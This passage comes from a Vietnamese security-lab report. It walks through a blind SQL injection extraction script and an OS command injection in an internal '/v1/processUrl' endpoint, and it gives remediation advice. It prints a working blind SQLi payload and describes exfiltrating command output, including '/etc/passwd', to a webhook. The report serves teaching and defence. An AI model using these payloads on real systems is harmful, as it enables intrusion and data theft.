Ở dòng 24, sau khi đã xác định được độ dài dữ liệu cần trích xuất, giá trị này được lưu trong biến `data_length`.`script` sử dụng vòng lặp `for` để lần lượt duyệt qua từng vị trí trong chuỗi dữ liệu, nhằm xác định ký tự tại vị trí đó.

Từ dòng 25-26, `script` thiết lặp phạm vị tìm kiếm theo bảng mã  ASCII. Vì mục tiêu trích xuất là từng ký tự trong cột `content`, nên ta cần xác định khoảng giá trị có thể xảy ra. 
- `left = 32` là ký tự đầu tiên có thể được in ra là `khoảng trắng`.
- `right = 126` là ký tự cuối cùng có thể được in ra `~`.
![image](https://hackmd.io/_uploads/HkymmMlMlx.png)
<p style="text-align:center"><em>Bảng mã ASCII</em></p>

Tiếp theo, ở dòng 27-28, vòng lặp `while left <= right:` dùng để thu hẹp dần phạm vi tìm kiếm trong bảng mã ASCII, với mục tiêu xác định chính xác mã ASCII của ký tự tại vị trí đang xét.
- Dòng `mid = (left + right) // 2` sẽ tính ra giá trị khoảng giữa của `left` và `right` - đây là cách hoạt động của tìm kiếm nhị phân. 

Từ dòng 29-35, `script` thực hiện kiểm tra điều kiện bằng cách gửi `payload`, nhằm kiểm tra xem ký tự tại ví trí `i` trong chuỗi dữ liệu có mã ASCII lớn hơn `mid` hay không. 
Với `payload` thứ hai có dạng:
```
%' AND (ASCII(SUBSTRING((SELECT GROUP_CONCAT(content) FROM flag),{i},1))>{mid}) AND 1='1
```
- Trong đó hàm `SUBSTRING((SELECT GROUP_CONCAT(content) FROM flag), {i}, 1)` để lấy ký tự thứ `i` từ kết quả truy vấn.
- ASCII() chuyển ký tự đó sang giá trị mã ASCII (số nguyên) để thực hiện mục tiêu so sánh với `mid`

Nếu phẩn hồi trả về có chứa `id`, điều đó cho thấy kết quả truy vấn đúng, nghĩa là ký tự hiện tại có mã ASCII lớn hơn `mid` nên thu hẹp phạm vi về bên phải`left = mid + 1`. 
Ngược lại, nếu không có `id` trong phản hồi, nghĩa là ký tự hiện tại đang nhỏ hơn `mid` nên thu hẹp phạm vi về bên trái `right = mid - 1`. 

Sau khi vòng lặp kết thúc, nếu dò dùng đúng ký tự thì cập nhật ký tự đó vào trong biến `data` ở dòng 36.

![image](https://hackmd.io/_uploads/rkQAtmeMle.png)
<p style="text-align:center"><em>`Script` thực hiện lấy data từ của cột `content` trong table `flag` thành công</em></p>

`Flag 5: CBJS{ae0d5fcd0ee9c4d4b1b281b4ee00e315}`

### Attachments
- `script.py`

### Recommendations 
- Sử dụng Prepared Statements.
- Xác thực và lọc dữ liệu đầu vào (Input Validation)
- Ghi lại log và giám sát

### References 
- https://portswigger.net/web-security/sql-injection/blind
- https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection

# 8. CBL-08: RCE at `/v1/processUrl` API Endpoint in Internal Web via OS Command Injection

### Description and Impact 
Lỗ hổng xuất hiện tại endpoint `/v1/processUrl` trong file `urlRoutes.js`, nằm tại đường dẫn `web/internal/app/routes` của dịch vụ web nội bộ (http://internal:3000/).

Tại API endpoint này, server chấp nhận dữ liệu từ phía client và xử lý một cách không an toàn bằng cách truyền dữ liệu đó vào một phương thức thực thi hệ thống (unsafe system execution). Điều này dẫn đến nguy cơ **Remote Code Execution (RCE)** hoặc thực thi các lệnh nguy hiểm trên hệ thống nội bộ.

### Root Cause Analysis
Lỗ hổng xảy ra, khi ta đã khai thác thành công lỗ hổng **CBL-06** khi đó đã đọc dược file `proc/self/environ` lấy được 1 API key của web nội bộ.

![image](https://hackmd.io/_uploads/rkJyvqxfeg.png)
<p style="text-align:center"><em>api `/v1/processUrl` tại file urlRoutes.js</em></p>

API này nhận  một `url` từ phía client, thực hiện request đến trang web đó (bằng `curl`), sau đó phân tích nội dung HTML để lấy ra các tag `meta` như `title`, `description` và `twitter`. 

![image](https://hackmd.io/_uploads/Hkn_ucxGxg.png)
<p style="text-align:center"><em>api `/v1/processUrl` tại file urlRoutes.js</em></p>

Việc nhận `url` từ người dùng và dùng hàm `execSynsc` để thực thi lệnh hệ thống ở dòng 51-52, mà không có các biện pháp bảo vệ. Điều này làm cho kẻ tấn công có thể khai thác lỗ hổng `OS command Injection`.

### Step to reproduce 
Sau khi đã RCE được từ lỗ hổng **CBL-06**, ta thực hiện `curl` tới api `/v1/processUrl` với API key đã biết trước đó. 

Với payload sau:
![image](https://hackmd.io/_uploads/Hy5BaqgGxl.png)
<p style="text-align:center"><em>payload test `os command injection`</em></p>


![image](https://hackmd.io/_uploads/S1Xb5qlGee.png)
<p style="text-align:center"><em>curl tới web internal tại `/api/v1/processUrl`</em></p>

Thì ta được thông báo thiếu `url`. Từ đây, ta có thể gửi kèm `url` với payload để thực thi lệnh `os` gửi request ra webhook.

với payload sau: 

![image](https://hackmd.io/_uploads/ByDQp5lGee.png)
<p style="text-align:center"><em>payload test `os command injection`</em></p>


![image](https://hackmd.io/_uploads/HyY6sceMge.png)
<p style="text-align:center"><em>Thực hiện payload gửi request ra webhook</em></p>


![image](https://hackmd.io/_uploads/r1wiicgGxg.png)
<p style="text-align:center"><em>request trả về webhook thành công</em></p>

Từ đây mình có thể đọc file nhạy cảm `/etc/passwd` trên server nội bộ.

![image](https://hackmd.io/_uploads/Hy3e6qezel.png)
<p style="text-align:center"><em>payload đọc file nội bộ</em></p>

![image](https://hackmd.io/_uploads/ryubT5lGxe.png)
<p style="text-align:center"><em>request trả về webhook thành công</em></p>

### Recommendations 
- Không sử dụng `execSync` với input từ người dùng.
- Thay thế `curl` bằng thư viện HTTP nội bộ an toàn.

### References 
- https://portswigger.net/web-security/os-command-injection
- https://portswigger.net/web-security/os-command-injection#how-to-prevent-os-command-injection-attacks

# III. Kết luận
Quá trình phân tích bảo mật đã phát hiện ra lỗ hổng nghiêm trọng trong ứng dụng. Lỗ hổng này xuất phát từ việc thiếu kiểm soát đầu vào, xử lý dữ liệu không an toàn,
và không áp dụng các biện pháp xác thực. Tác động tiềm tàng bao gồm lộ dữ liệu người dùng, leo thang đặc quyền, và kiểm soát máy chủ, đe dọa nghiêm trọng đến tính bảo mật và toàn vẹn của hệ thống.
<p style="text-align: right;">Trân trọng, h4gphwc</p>